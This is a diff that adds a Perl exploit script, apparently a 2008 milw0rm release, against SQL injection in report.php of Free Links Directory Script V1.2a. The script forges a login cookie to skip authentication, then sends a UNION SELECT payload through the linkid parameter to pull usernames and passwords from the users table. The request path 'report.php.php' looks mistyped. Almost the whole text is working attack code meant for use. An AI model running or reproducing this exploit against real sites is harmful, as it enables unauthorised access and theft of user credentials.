@@ -1,0 +1,46 @@
+#!/usr/bin/perl -w
+#
+# Free Links Directory Script V1.2a Remote SQL Injection Exploit
+# written by ka0x <ka0x01[alt+64]gmail.com>
+# D.O.M Labs Security Researchers
+# - www.domlabs.org -
+#
+# Vuln code (report.php):
+#
+# if($_COOKIE['logged']=="") {
+# [...] // login
+# else {
+#     $linkida = $_GET['linkid'];
+#     $linkinfo = mysql_fetch_array(mysql_query("select * from links where id=$linkida"))
+# [...]
+#
+
+use strict;
+use LWP::UserAgent;
+ 
+my $host = $ARGV[0];
+
+die "[*] usage: perl $0 <host>\n" unless $ARGV[0];
+
+if ($host !~ /^http:/){ $host = 'http://'.$host; }
+
+my $ua = LWP::UserAgent->new() or die ;
+$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008072820 Firefox/3.0.1") ;
+$ua->timeout(10) ;
+$ua->default_header('Cookie' => "logged=d0ml4bs"); # value $_COOKIE['logged'], Cookie: logged=d0ml4bs
+
+my $req = HTTP::Request->new(GET => $host."report.php.php?linkid=-1/**/UNION/**/SELECT/**/1,concat(0x5f5f5f5f,0x5b215d20757365723a20,username,0x20205b215d20706173733a20,password,0x5f5f5f5f),3,4,5,6,7,8,9,10,11/**/FROM/**/users");
+
+my $res = $ua->request($req);
+my $con = $res->content;
+
+if ($res->is_success && $con =~ m/____(.*?)____/ms){
+    print $1;
+}
+else {
+    print "[-] exploit failed!\n";
+}
+
+__END__
+
+# milw0rm.com [2008-12-16]
